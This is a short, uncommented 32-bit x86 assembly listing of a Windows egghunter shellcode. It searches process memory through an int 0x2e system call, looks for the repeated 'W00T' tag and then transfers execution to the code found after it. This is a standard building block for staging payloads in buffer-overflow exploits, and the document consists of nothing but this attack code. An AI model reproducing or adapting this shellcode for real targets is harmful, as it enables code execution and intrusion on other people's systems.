[BITS 32]
mov esp, ebp
xor edx, edx
or dx,0xfff
inc edx
push edx
push byte +0x2
pop eax
int 0x2e
cmp al,0x5
pop edx
jz 0x4
mov eax,0x57303054
mov edi,edx
scasd
jnz 0x5
scasd
jnz 0x5
jmp edi
